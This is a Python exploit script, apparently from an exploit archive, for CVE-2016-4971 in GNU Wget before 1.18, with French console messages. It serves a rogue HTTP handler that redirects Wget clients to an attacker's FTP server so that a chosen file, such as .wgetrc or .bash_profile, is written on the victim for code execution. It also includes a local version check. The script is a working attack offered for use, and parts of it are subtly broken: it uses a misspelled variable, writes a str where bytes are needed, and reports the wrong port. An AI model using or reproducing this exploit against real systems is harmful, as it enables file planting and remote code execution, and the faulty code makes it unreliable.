# Exploit Title: GNU Wget < 1.18 - Arbitrary File Upload / Remote Code Execution (2)
# Original Exploit Author: Dawid Golunski
# Exploit Author: liewehacksie
# Version: GNU Wget < 1.18 
# CVE: CVE-2016-4971

import http.server
import socketserver
import socket
from colorama import init ,Fore
import os

init(autoreset=True)

def exploit(expresion):
   class wgetExploit(http.server.SimpleHTTPRequestHandler):
      def do_GET(self):
         # This takes care of sending .wgetrc/.bash_profile/$file
         print("Nouvelle requete " + self.path + " avec la methode GET :)")
         if "Wget" not in self.headers.get('User-Agent'):
            print(Fore.RED + "il ne s\'agit pas d\'une requete lancée pa Wget :( \n")
            self.send_response(200)
            self.end_headers()
            self.wfile.write("Nothing to see here...")
            return

         self.send_response(301)
         print(Fore.GREEN + "Téléchargement du fichier " + str() + "via ftp .  \n")
         new_path = 'ftp://anonymous@{}:{}/{}'.format(expresion.LHOST, expresion.LPORT, expresion.CODE)
         print("Envoie de la redirection vers %s \n"%(new_path))
         self.send_header('Location', new_path)
         self.end_headers()

   handler = socketserver.TCPServer((expresion.LHOST,80),wgetExploit)
   sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   result = sock.connect_ex((expresion.LHOST, expression.LPORT))
   if result == 0:
      pass
   else:
      print(Fore.RED + "Serveur FTP indisponible.")
      return
   print("Serveur http sur le port 8080 \n")
   handler.serve_forever()

def detect(expression):
   rep=os.popen('wget --version').readline().replace('GNU ','')
   v=''
   i=0
   x=['0','1','2','3','4','5','6','7','8','9']
   while True:
      try:
         if rep[i] in x or rep[i] == '.':
            v+=rep[i]
         i+=1
      except:
         break
   rep=float(v[0:-1])
   if rep < 1.18:
      return 'CVE-2016-4971'
   else:
      return False

def notice():
   print(Fore.RED + "Cette exploit ne fonctionnera pas si le Server FTP ne pas en marche")
   print(Fore.RED + "Cete exploit exige:\n LHOST : votre adresse IP ,elle sera utilisé pour configuré le Server FTP et HTTP \n LPORT : Port utilisée pour le Server FTP ,http est sur le port 80")
   print(Fore.RED + " CODE : le nom du fichier à Télécharger \n")
